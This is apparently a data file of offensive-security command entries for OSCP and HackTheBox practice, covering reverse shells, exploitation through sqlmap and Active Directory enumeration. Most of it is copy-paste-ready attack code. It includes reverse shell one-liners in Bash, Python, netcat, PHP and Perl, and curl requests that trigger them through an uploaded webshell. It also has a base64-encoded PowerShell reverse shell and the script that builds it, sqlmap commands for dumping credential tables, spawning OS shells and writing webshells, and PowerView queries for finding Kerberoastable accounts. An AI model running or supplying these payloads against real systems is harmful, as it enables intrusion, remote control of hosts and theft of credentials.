   python3 -c 'import pty; pty.spawn(""/bin/bash"")'
   Ctrl+Z
   stty raw -echo; fg
   export TERM=xterm

5. Begin enumeration
   whoami, id, sudo -l, ls -la /home

Reverse shell payloads:
(1) Bash TCP (THIS COMMAND)
    bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
     Most common, works on most Linux

(2) Bash UDP  
    bash -c 'bash -i >& /dev/udp/LHOST/LPORT 0>&1'
     Alternative if TCP blocked

(3) Python3
    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""LHOST"",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""]);'
     When bash not available

(4) Python2
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""LHOST"",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""]);'

(5) Netcat (traditional)
    nc LHOST LPORT -e /bin/bash
     If nc compiled with -e support

(6) Netcat (no -e)
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f
     Works on all nc versions

(7) PHP
    php -r '$sock=fsockopen(""LHOST"",LPORT);exec(""/bin/sh -i <&3 >&3 2>&3"");'

(8) Perl
    perl -e 'use Socket;$i=""LHOST"";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};'

URL encoding for curl:
bash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1'
 bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F9001%200%3E%261%27

Full command (properly encoded):
curl 'http://target/uploads/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F9001%200%3E%261%27'

Or use revshells.com:
1. Visit https://www.revshells.com/
2. Select ""Bash TCP""
3. Enter LHOST and LPORT
4. Copy URL-encoded payload
5. Paste into webshell URL

Troubleshooting no connection:
(1) Verify listener running
    netstat -tulpn | grep 9001
     Should show LISTEN

(2) Check target can reach attacker
    # Via webshell
    curl 'http://target/shell.php?cmd=ping -c 1 10.10.14.5'
     Verify ICMP

(3) Try different ports
    Common egress ports: 80, 443, 53, 8080, 8443
    nc -lvnp 443  # Attacker (requires root for <1024)
    # Update payload with new port

(4) Try alternative payload
    Python instead of bash
    UDP instead of TCP
    Socat for encrypted shell

(5) Check firewall rules
    # Via webshell
    curl 'http://target/shell.php?cmd=iptables -L'
     Check OUTPUT chain

Multiple attempts:
# Try ports 80, 443, 53, 9001
for port in 80 443 53 9001; do
  echo ""[+] Trying port $port""
  nc -lvnp $port &
  sleep 2
  curl ""http://target/uploads/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.5/$port 0>&1'""
  sleep 5
  killall nc
done

OSCP HackTheBox Usage workflow:
1. Webshell uploaded: http://usage.htb/avatars/shell.php
2. Start listener:
   nc -lvnp 9001
3. Execute reverse shell (THIS COMMAND):
   curl 'http://usage.htb/avatars/shell.php?cmd=bash -c ""bash -i >& /dev/tcp/10.10.14.5/9001 0>&1""'
4. Connection received:
   www-data@usage:/$
5. Upgrade shell:
   python3 -c 'import pty; pty.spawn(""/bin/bash"")'
   Ctrl+Z
   stty raw -echo; fg
   export TERM=xterm
6. Enumerate:
   whoami  www-data
   id  uid=33(www-data)
   ls -la /home  Users: dash, xander

OSCP exam tip: Have reverse shell payload ready before exam (save in notes). Use revshells.com for URL-encoded payloads. Try port 443 first (commonly allowed outbound). Immediately upgrade to PTY after connection. If reverse shell fails, continue with webshell but prioritize finding egress path.

Time estimate: 30 seconds (execution) + 30 seconds (shell upgrade)","high","","","","{""no_connection"": ""Firewall blocking egress. Try different ports (80, 443, 53). Verify LHOST reachable from target. Check listener running: netstat -tulpn | grep LPORT"", ""bash_not_found"": ""Bash not available. Try alternatives: sh, /bin/sh, python, nc. Check available shells: cat /etc/shells"", ""connection_closes"": ""Shell dying immediately. Upgrade to PTY: python3 -c 'import pty; pty.spawn(\""/bin/bash\"")'. Or use stable payload (socat, meterpreter)"", ""url_encoding_issues"": ""Special characters breaking command. Proper encoding: spaces=%20, &=%26, |=%7C, >=%3E. Use single quotes in curl: curl 'http://...' not curl http://...""}","","[""nc-listener"", ""web-access-uploaded-file""]","","[""pty-spawn-script"", ""linux-enumerate-users"", ""check-sudo-privs""]"
"sqlmap-from-request","SQLMap from Request File","web","sqlmap -r <REQUEST_FILE> -p <PARAMETER> --batch","Run SQLMap using saved HTTP request file from Burp Suite (preserves headers, cookies, POST data)","sql-injection","sqlmap -r reset.req -p email --batch","CRITICAL OSCP technique: Using request files preserves ALL HTTP context.

Why use -r instead of -u:
(1) Preserves custom headers
(2) Maintains session cookies
(3) Preserves exact POST data format
(4) Captures Content-Type

Creating request file from Burp:
1. Intercept request in Burp Proxy
2. Right-click  Copy to file
3. Save as .req file (e.g., reset.req)
4. Run sqlmap -r reset.req

OSCP TIP: ALWAYS test manually first with single quote. Document findings before using sqlmap.

Time estimate: 5-10 minutes","high","","","","{""file_not_found"": ""Check request file path. Format: POST /reset HTTP/1.1\\nHost: target.com\\nContent-Type: application/x-www-form-urlencoded\\n\\nemail=test@test.com"", ""invalid_request_format"": ""Request file must be RAW HTTP request with headers. Copy from Burp: Right-click \u2192 Copy to file"", ""default_level_insufficient"": ""If no injection found, use sqlmap-from-request-level3 (--level 3) for more thorough testing""}","{""-r"": ""Read request from file - preserves exact HTTP request including headers, cookies, POST data, Content-Type"", ""-p"": ""Specify parameter to test - focuses sqlmap on single parameter instead of testing all"", ""--batch"": ""Never ask for user input, use default behavior - essential for automation and consistency""}","[""sqli-manual-test""]","[""sqli-manual-test""]","[""sqlmap-from-request-level3"", ""sqlmap-enumerate-databases""]"
"sqlmap-from-request-level3","SQLMap from Request with Level 3","web","sqlmap -r <REQUEST_FILE> -p <PARAMETER> --batch --level 3","Run SQLMap with increased test depth (level 3) for detecting complex/blind SQL injection that default level misses","sql-injection","sqlmap -r reset.req -p email --batch --level 3","CRITICAL OSCP LESSON from HackTheBox Usage machine:

DEFAULT SQLMAP (--level 1) FAILED to detect blind SQLi.
MANUAL TESTING confirmed vulnerability.
SOLUTION: --level 3 successfully detected it.

Level 1 (default): ~100 payloads, basic GET/POST
Level 3: ~500 payloads, adds headers, more variations

Time estimate:
Level 1: 5-10 minutes
Level 3: 15-30 minutes

Trust manual verification over tool defaults.
Document in failed_attempts.md.","high","","","","{""still_not_detected"": ""Try --level 5 (max). Add --risk 2 or --risk 3. Verify manual SQLi first"", ""too_slow"": ""Level 3 tests more injection points. Add --threads 5"", ""waf_blocking"": ""Add --delay=2. Use --random-agent and --tamper=space2comment""}","{""-r"": ""Read request from file"", ""-p"": ""Specify parameter to test"", ""--batch"": ""Never ask for user input"", ""--level 3"": ""CRITICAL - Increases test thoroughness. Tests HTTP headers (User-Agent, Referer, Cookie), more payload variations. Required for detecting subtle blind SQLi""}","[""sqli-manual-test"", ""sqlmap-from-request""]","[""sqlmap-from-request""]","[""sqlmap-enumerate-databases""]"
"sqlmap-enumerate-databases","SQLMap Enumerate Databases","web","sqlmap -r <REQUEST_FILE> -p <PARAMETER> --batch --dbs","Enumerate all database names on target server (first step after confirming SQL injection)","sql-injection","sqlmap -r reset.req -p email --batch --dbs","Standard sqlmap workflow:
1. Confirm SQLi
2. Enumerate databases (THIS COMMAND)
3. Enumerate tables
4. Dump data

Ignore system databases (information_schema, mysql, postgres, master).
Focus on application databases.

Time estimate: 1-5 minutes","high","","","","{""no_databases_enumerated"": ""Verify SQLi confirmed first. Check --current-db"", ""only_system_databases"": ""Use --current-db then enumerate tables directly"", ""slow_enumeration"": ""Add --threads 5""}","{""-r"": ""Read request from file"", ""-p"": ""Specify vulnerable parameter"", ""--batch"": ""Never ask for user input"", ""--dbs"": ""Enumerate database names only - does NOT dump data, just lists database names""}","[""sqlmap-from-request-level3""]","[""sqli-union-mysql-info""]","[""sqlmap-enumerate-tables""]"
"sqlmap-enumerate-tables","SQLMap Enumerate Tables","web","sqlmap -r <REQUEST_FILE> -p <PARAMETER> --batch -D <DATABASE> --tables","Enumerate all table names in specified database (step 2 after database enumeration)","sql-injection","sqlmap -r reset.req -p email --batch -D usage_blog --tables","High-value table names (OSCP targets):
- users, admin, accounts
- credentials, passwords, config

Prioritization:
1. Dump authentication tables first
2. Then credentials/config
3. Application data if needed

OSCP tip: Don't enumerate ALL tables. Target high-value first.

Time estimate: 1-3 minutes (UNION), 10-20 minutes (blind)","high","","","","{""database_not_found"": ""Verify exact database name (case-sensitive)"", ""slow_enumeration"": ""Add --threads 5. Or guess table names and dump directly"", ""too_many_tables"": ""Target specific tables: -T users,admin --dump""}","{""-r"": ""Read request from file"", ""-p"": ""Specify vulnerable parameter"", ""--batch"": ""Never ask for user input"", ""-D"": ""Specify database name - must match exact name from --dbs output"", ""--tables"": ""Enumerate table names only - does NOT dump data""}","[""sqlmap-enumerate-databases""]","[""sqli-union-mysql-info""]","[""sqlmap-dump-table""]"
"sqlmap-dump-table","SQLMap Dump Table Data","web","sqlmap -r <REQUEST_FILE> -p <PARAMETER> --batch -D <DATABASE> -T <TABLE> --dump","Dump complete contents of specified table including all columns and rows (final step to extract credentials/data)","sql-injection","sqlmap -r reset.req -p email --batch -D usage_blog -T admin_users --dump","Final step in SQL injection exploitation.

Output location: ~/.local/share/sqlmap/output/<TARGET>/dump/<DATABASE>/<TABLE>.csv

Post-dump actions:
1. Check for plaintext passwords
2. Crack hashes with john/hashcat
3. Test credentials on SSH, admin panels, other services
4. Check for password reuse

Time estimate:
UNION: 30 sec - 2 min (100 rows)
Boolean blind: 10-30 min

Document in breakthrough.md.","high","","","","{""table_not_found"": ""Verify exact table name (case-sensitive)"", ""too_much_data"": ""Limit rows: --start=1 --stop=100. Or filter: --where='username LIKE \""%admin%\""'"", ""slow_extraction"": ""Add --threads 5. Dump specific columns: -C username,password""}","{""-r"": ""Read request from file"", ""-p"": ""Specify vulnerable parameter"", ""--batch"": ""Never ask for user input - auto-cracks password hashes, auto-saves to CSV"", ""-D"": ""Specify database name"", ""-T"": ""Specify table name to dump"", ""--dump"": ""Dump ALL columns and rows - extracts complete data, saves to CSV, auto-detects hashes""}","[""sqlmap-enumerate-databases"", ""sqlmap-enumerate-tables""]","[""sqli-union-mysql-info""]","[""john-crack-bcrypt"", ""ssh-connect-password""]"
"curl-wordpress-version-feed","WordPress Version Detection via Feed","web","curl -s <URL>/feed/ | grep generator","Detect WordPress version by parsing RSS feed generator tag","cms-enumeration","curl -s http://example.com/feed/ | grep generator","RSS feed at /feed/ contains <generator> tag with WordPress version.

Example:
<generator>https://wordpress.org/?v=5.8.1</generator>.

More comprehensive:
wpscan --url <URL> --enumerate vp,vt,u","high","","","","","{""-s"": ""Silent mode (suppress progress bar)"", ""| grep generator"": ""Filter for generator meta tag containing version""}","","[""wpscan-enumerate-all""]",""
"sqlmap-fingerprint","SQLMap Database Fingerprint","web","sqlmap -u '<URL>' --batch --banner --fingerprint","Identify database type, version, and fingerprint for targeted exploitation","","sqlmap -u 'http://192.168.45.100/page.php?id=1' --batch --banner --fingerprint","First step before attempting OS shell. Identifies MSSQL (xp_cmdshell), MySQL (INTO OUTFILE), PostgreSQL (COPY). Version determines available exploits.","high","","","","","{""--banner"": ""Retrieve database management system banner (version info)"", ""--fingerprint"": ""Perform extensive database fingerprinting to identify exact DBMS type and version""}","","",""
"sqlmap-is-dba","SQLMap Check DBA Privileges","web","sqlmap -u '<URL>' -p <PARAMETER> --is-dba --batch","Check if current database user has DBA (sysadmin) privileges required for OS shell","","sqlmap -u 'http://192.168.45.100/page.php?id=1' -p id --is-dba --batch","DBA required for: MSSQL xp_cmdshell, MySQL FILE privilege operations, PostgreSQL COPY. If not DBA, try --priv-esc or look for other attack vectors.","high","","","","","{""-p"": ""Specify parameter to test"", ""--is-dba"": ""Check if database user is DBA/sysadmin - required for xp_cmdshell and file operations""}","","",""
"sqlmap-privileges","SQLMap Enumerate User Privileges","web","sqlmap -u '<URL>' -p <PARAMETER> --privileges --batch","Enumerate database user privileges to determine available attack paths","","sqlmap -u 'http://192.168.45.100/page.php?id=1' -p id --privileges --batch","Look for: FILE (MySQL webshell), SUPER (MySQL UDF), PROCESS (info leak). MSSQL shows sysadmin/serveradmin roles.","medium","","","","","{""--privileges"": ""Enumerate DBMS user privileges - shows FILE, SUPER, PROCESS, etc.""}","","",""
"sqlmap-os-shell","SQLMap OS Shell","web","sqlmap -u '<URL>' -p <PARAMETER> --os-shell --batch","Attempt to spawn interactive OS shell through SQL injection (auto-selects technique based on DBMS)","","sqlmap -u 'http://192.168.45.100/page.php?id=1' -p id --os-shell --batch","Fastest path from SQLi to shell. Requires DBA privileges. Auto-handles xp_cmdshell enable/disable for MSSQL. May prompt for web root path for webshell techniques.","high","","","","","{""--os-shell"": ""Spawn interactive OS shell - uses xp_cmdshell (MSSQL), INTO OUTFILE (MySQL), COPY (PostgreSQL)""}","","",""
"sqlmap-os-shell-mssql","SQLMap OS Shell MSSQL","web","sqlmap -u '<URL>' -p <PARAMETER> --os-shell --dbms=mssql --batch","Force MSSQL-specific OS shell using xp_cmdshell extended stored procedure","","sqlmap -u 'http://192.168.45.100/page.aspx?id=1' -p id --os-shell --dbms=mssql --batch","MSSQL uses xp_cmdshell for command execution. sqlmap auto-enables if disabled (requires sysadmin). Commands run as SQL Server service account (often high privilege).","high","","","","","{""--os-shell"": ""Spawn OS shell"", ""--dbms=mssql"": ""Force Microsoft SQL Server techniques - ensures xp_cmdshell is used""}","","",""
"sqlmap-os-shell-mysql","SQLMap OS Shell MySQL","web","sqlmap -u '<URL>' -p <PARAMETER> --os-shell --dbms=mysql --batch","Force MySQL-specific OS shell using INTO OUTFILE webshell or UDF injection","","sqlmap -u 'http://192.168.45.100/page.php?id=1' -p id --os-shell --dbms=mysql --batch","MySQL requires FILE privilege and @@secure_file_priv empty/accessible. sqlmap prompts for web root path. Creates PHP webshell for command execution.","high","","","","","{""--os-shell"": ""Spawn OS shell"", ""--dbms=mysql"": ""Force MySQL techniques - uses INTO OUTFILE webshell or UDF injection""}","","",""
"sqlmap-os-shell-postgresql","SQLMap OS Shell PostgreSQL","web","sqlmap -u '<URL>' -p <PARAMETER> --os-shell --dbms=postgresql --batch","Force PostgreSQL-specific OS shell using COPY or large object functions","","sqlmap -u 'http://192.168.45.100/page.py?id=1' -p id --os-shell --dbms=postgresql --batch","PostgreSQL requires superuser role. Uses COPY TO PROGRAM (9.3+) for direct command execution or large object export for webshell.","high","","","","","{""--os-shell"": ""Spawn OS shell"", ""--dbms=postgresql"": ""Force PostgreSQL techniques - uses COPY TO or lo_export for file write""}","","",""
"sqlmap-os-cmd","SQLMap Single OS Command","web","sqlmap -u '<URL>' -p <PARAMETER> --os-cmd='<COMMAND>' --batch","Execute single OS command through SQL injection without interactive shell","","sqlmap -u 'http://192.168.45.100/page.php?id=1' -p id --os-cmd='whoami' --batch","Use for quick command execution without interactive shell overhead. Good for verifying RCE before establishing reverse shell.","high","","","","","{""--os-cmd"": ""Execute single command and return output - faster than --os-shell for quick checks""}","","",""
"sqlmap-file-write","SQLMap Write File","web","sqlmap -u '<URL>' -p <PARAMETER> --file-write='<LOCAL_FILE>' --file-dest='<REMOTE_PATH>' --batch","Upload local file to target server through SQL injection (webshell, tools, etc.)","","sqlmap -u 'http://192.168.45.100/page.php?id=1' -p id --file-write='./shell.php' --file-dest='/var/www/html/shell.php' --batch","Requires FILE privilege (MySQL) or appropriate write permissions. Use for uploading custom webshells when --os-shell fails. Must know exact web root path.","high","","","","","{""--file-write"": ""Local file to upload to target"", ""--file-dest"": ""Absolute path on target where file will be written""}","","",""
"ps-reverse-shell-base64","PowerShell Base64 Encoded Reverse Shell","exploitation","powershell -nop -w hidden -e <BASE64_PAYLOAD>","Base64-encoded PowerShell reverse shell for obfuscation and easy command-line execution","REVERSE_SHELL","powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAiACwANAA0ADMAKQA7AA...","","","[{""command"": ""powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"", ""description"": ""Reverse shell connecting to 192.168.118.2:443 - execute after setting up nc listener on attacker machine"", ""context"": ""OSCP lateral movement with WinRM/WMI""}]","{""purpose"": ""Establish reverse TCP connection from Windows target to attacker listener, providing interactive PowerShell session. Base64 encoding avoids special character escaping issues."", ""manual_alternative"": ""Non-encoded: powershell -c \""$client = New-Object System.Net.Sockets.TCPClient('192.168.118.2',443);...\"" (requires careful escaping)"", ""common_failures"": [""No listener on attacker machine - must run 'nc -lnvp <PORT>' before executing payload"", ""Firewall blocking outbound connection from target to attacker IP/port"", ""AV/EDR detecting PowerShell reverse shell patterns (consider obfuscation)"", ""Incorrect base64 encoding (must be UTF-16LE encoded before base64)""], ""when_to_use"": [""After successful lateral movement via WinRM/WMI/PsExec"", ""When you need interactive shell on compromised Windows host"", ""Command injection or RCE exploitation requires full shell access"", ""Alternative to bind shells when target has outbound firewall rules""], ""exam_relevance"": ""CRITICAL for OSCP - primary method for obtaining interactive shells on Windows targets after initial access or lateral movement"", ""time_estimate"": ""2-5 seconds to establish connection"", ""technical_notes"": [""Payload must be encoded in UTF-16LE before base64 (PowerShell default encoding)"", ""Use ps-reverse-shell-encoder-python to generate properly encoded payload"", ""Connection is TCP-based (not UDP) - ensure listener matches protocol"", ""Session persists until client closes or network disconnects""]}","[""ps-reverse-shell-encoder-python"", ""ps-winrm-invoke-command"", ""ps-wmi-invoke-method"", ""nc-listener""]","","","[""ps-reverse-shell-encoder-python"", ""nc-listener-setup""]","[""msfvenom-powershell-reverse"", ""bash-reverse-shell""]","[""mimikatz-sekurlsa-logonpasswords"", ""systeminfo-windows"", ""whoami-priv""]"
"ps-reverse-shell-encoder-python","Python Script - PowerShell Reverse Shell Base64 Encoder","exploitation","python3 encode.py","Python script to generate base64-encoded PowerShell reverse shell with custom LHOST/LPORT","PAYLOAD_GENERATION","","","","[{""command"": ""# Save script as encode.py, modify LHOST/LPORT, then run:\npython3 encode.py"", ""description"": ""Generate base64 payload connecting to 192.168.118.2:443"", ""context"": ""Prepare reverse shell before lateral movement""}, {""command"": ""# Example script with custom values:\nimport sys\nimport base64\n\npayload = '$client = New-Object System.Net.Sockets.TCPClient(\""192.168.118.2\"",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \""PS \"" + (pwd).Path + \""> \"";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'\n\ncmd = \""powershell -nop -w hidden -e \"" + base64.b64encode(payload.encode('utf16')[2:]).decode()\n\nprint(cmd)"", ""description"": ""Complete script example with LHOST=192.168.118.2 and LPORT=443"", ""context"": ""Copy-paste ready script""}]","{""purpose"": ""Automate creation of properly encoded PowerShell reverse shell payloads. Handles UTF-16LE encoding and base64 conversion required by PowerShell -EncodedCommand flag."", ""manual_alternative"": ""Manual base64 encoding: echo -n '<PAYLOAD>' | iconv -t UTF-16LE | base64 -w 0 (error-prone with special characters)"", ""common_failures"": [""Forgetting to modify <LHOST> and <LPORT> placeholders before running script"", ""Using wrong encoding (UTF-8 instead of UTF-16LE) causes PowerShell decode errors"", ""Not removing BOM (Byte Order Mark) with [2:] slice results in malformed payload""], ""when_to_use"": [""Before WinRM/WMI lateral movement when reverse shell needed"", ""Generating payloads for command injection or RCE exploits"", ""Creating obfuscated PowerShell commands to bypass simple string detection"", ""OSCP exam prep - pre-generate payloads for common scenarios""], ""exam_relevance"": ""HIGH - Save time during OSCP exam by having encoder script ready. Generate custom payloads in seconds rather than manual encoding."", ""time_estimate"": ""<5 seconds to generate payload"", ""technical_notes"": [""payload.encode('utf16') adds BOM - [2:] removes first 2 bytes (BOM)"", ""PowerShell -EncodedCommand expects UTF-16LE base64 encoding"", ""Output is complete command ready for copy-paste to WinRM/WMI commands"", ""Script handles escaping automatically - no manual quote escaping needed""]}","[""ps-reverse-shell-base64"", ""ps-winrm-invoke-command"", ""ps-wmi-invoke-method"", ""nc-listener""]","","","","[""revshell-ps-generator""]","[""ps-reverse-shell-base64"", ""nc-listener-setup""]"
"powerview-get-netdomain","Get Domain Information (PowerView)","enumeration","Get-NetDomain","Retrieve current domain information including forest, domain controllers, PDC, and domain properties using PowerView","","","POWERVIEW SIMPLIFICATION:
Simplifies .NET LDAP queries into easy cmdlets.

EQUIVALENT TO:
  [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

RETURNS CRITICAL PROPERTIES:
- PdcRoleOwner:
Target for enumeration
- DomainMode:
Functional level
- Forest:
Multi-domain environments

OSCP:
Import PowerView at start of AD enumeration.

ALTERNATIVE:
  $env:userdnsdomain

Time:
<5 seconds","high","","","","{""Get-NetDomain not recognized"": ""PowerView not imported. Import: Import-Module .\\PowerView.ps1 or dot-source: . .\\PowerView.ps1"", ""Access Denied"": ""Not logged in as domain user. Verify: whoami /fqdn""}","","","[""ps-get-current-domain""]","[""powerview-get-netdomaincontroller"", ""powerview-get-netuser"", ""powerview-get-netgroup""]"
"powerview-get-netdomaincontroller","Enumerate Domain Controllers (PowerView)","enumeration","Get-NetDomainController","List all domain controllers in the current domain with IP addresses, OS versions, and roles","","","ENUMERATE ALL DOMAIN CONTROLLERS:
KEY PROPERTIES:
- IPAddress:
Direct targeting
- OSVersion:
Identify legacy DCs (2008, 2012)
- Forest:
Forest root (multi-domain)
- PdcRoleOwner:
PDC identification

OSCP:
Identify PDC from PdcRoleOwner field.
Use PDC for all subsequent enumeration (accuracy).

Time:
<5 seconds","high","","","","{""Module not imported"": ""Import-Module .\\PowerView.ps1"", ""Unable to contact domain"": ""DC unreachable. Check network connectivity: ping <DC>""}","","[""import-powerview""]","[""ps-get-pdc""]",""
"powerview-get-netuser","Enumerate All Domain Users (PowerView)","enumeration","Get-NetUser","Retrieve all user accounts in the domain with all attributes displayed","","","ENUMERATE ALL DOMAIN USERS:
WARNING:
Returns ALL attributes for ALL users.
Output can be overwhelming in large domains.

FILTER WITH SELECT:
  Get-NetUser | select samaccountname,pwdlastset,lastlogon

LOOK FOR:
- Dormant accounts:
Old lastlogon
- Weak passwords:
Old pwdlastset
- Admin accounts:
memberof contains Domain Admins

OSCP:
Pipe to select immediately (avoid overload).

Time:
10-30 seconds","high","","","","{""Module not imported"": ""Import-Module .\\PowerView.ps1"", ""Too much output"": ""Filter attributes: Get-NetUser | select samaccountname,description,memberof | Format-Table""}","","[""import-powerview""]","[""net-user-domain-list"", ""ps-directorysearcher-users""]","[""powerview-get-netuser-filter"", ""powerview-get-netuser-spn""]"
"powerview-get-netuser-filter","Get Specific Domain User (PowerView)","enumeration","Get-NetUser -Identity <USERNAME>","Retrieve detailed information about a specific domain user","","Get-NetUser -Identity administrator","QUERY SPECIFIC USER:
Faster than Get-NetUser | Where-Object
Queries AD directly.

KEY ATTRIBUTES:
- memberof:
Group memberships (Domain Admins?)
- admincount:
1 = protected admin account
- pwdlastset:
Password age (old = weak)
- serviceprincipalname:
Kerberoastable?
- useraccountcontrol:
Account flags

OSCP:
Quickly profile high-value targets.

Time:
<5 seconds","high","","","","{""User not found"": ""Verify spelling. List all users first: Get-NetUser | select samaccountname""}","{""-Identity"": ""Specifies the user to query. Accepts samaccountname, distinguished name, or SID. Faster than filtering all users.""}","[""import-powerview"", ""powerview-get-netuser""]","[""net-user-domain-detail""]",""
"powerview-get-netuser-spn","Find Kerberoastable Accounts (PowerView)","enumeration","Get-NetUser -SPN | select samaccountname,serviceprincipalname","Enumerate all user accounts with Service Principal Names registered (Kerberoastable targets)","","","KERBEROASTING TARGETS:
SERVICE ACCOUNT CHARACTERISTICS:
- Elevated privileges (local admin, DB access)
- Weak passwords (rarely changed)

SPN FORMAT REVEALS SERVICE:
- HTTP/:
Web servers
- MSSQLSvc/:
SQL Server
- TERMSRV/:
RDP

KERBEROASTING WORKFLOW:
1.

Request service ticket (valid domain creds)

2.

Extract ticket (contains password hash)

3.

Crack offline (hashcat/john, no lockout)

OSCP:
Most reliable privesc technique.
Enumerate SPNs early.

Time:
5-10 seconds","high","","","","{""krbtgt showing in results"": ""krbtgt has SPNs but is not Kerberoastable. Filter out: Get-NetUser -SPN | ? {$_.samaccountname -ne 'krbtgt'}""}","{""-SPN"": ""Filters users with servicePrincipalName attribute set. These accounts run services and are Kerberoastable - service tickets can be requested and cracked offline.""}","[""import-powerview""]","[""setspn-query-all""]",""
"powerview-get-netgroup","Enumerate All Domain Groups (PowerView)","enumeration","Get-NetGroup | select cn","List all security groups in the domain with clean output","","","ENUMERATE ALL GROUPS:
DEFAULT HIGH-PRIVILEGE:
- Domain Admins:
Domain-wide admin
- Enterprise Admins:
Forest-wide admin
- Administrators:
Local admin on computers

CUSTOM GROUPS REVEAL STRUCTURE:
- IT_Admins
- SQL_DBAs
- Service_Accounts
- Management

OSCP:
Look for 'Admin', 'IT', 'Service', 'Management' in names.
Often have elevated privileges.

Time:
5-10 seconds","high","","","","{""Module not imported"": ""Import-Module .\\PowerView.ps1""}","{""select cn"": ""Filters output to only show Common Name (group name). Without this, PowerView returns all attributes which is overwhelming.""}","[""import-powerview""]","[""net-group-domain-list"", ""ps-directorysearcher-groups""]","[""powerview-get-netgroup-specific"", ""powerview-get-netgroupmember""]"
"powerview-get-netgroup-specific","Get Specific Group Details (PowerView)","enumeration","Get-NetGroup -Identity ""<GROUPNAME>"" | select member","Retrieve members of a specific domain group","","Get-NetGroup -Identity ""Domain Admins"" | select member","MEMBER ATTRIBUTE FORMAT:
Distinguished names (LDAP), not usernames.

FORMAT:
- Users:
CN=username,CN=Users,DC=corp,DC=com
- Nested groups:
CN=groupname,CN=Users,DC=corp,DC=com

NESTED GROUP DETECTION:
DN starts with 'CN=' and contains 'CN=Users' = likely group.

BETTER ALTERNATIVE:
Get-NetGroupMember -Recurse (auto-resolves nested)

OSCP:
Domain Admins members = instant win.

Time:
<5 seconds","high","","","","{""Group not found"": ""Use quotes for group names with spaces. Verify exact name: Get-NetGroup | select cn"", ""Member field shows distinguished names"": ""Use Get-NetGroupMember for cleaner output with resolved usernames""}","{""-Identity"": ""Specifies the group to query. Accepts group name, distinguished name, or SID."", ""select member"": ""Displays only the member attribute (group members). Members shown as distinguished names.""}","[""import-powerview"", ""powerview-get-netgroup""]","[""net-group-domain-members""]","[""powerview-get-netgroupmember""]"
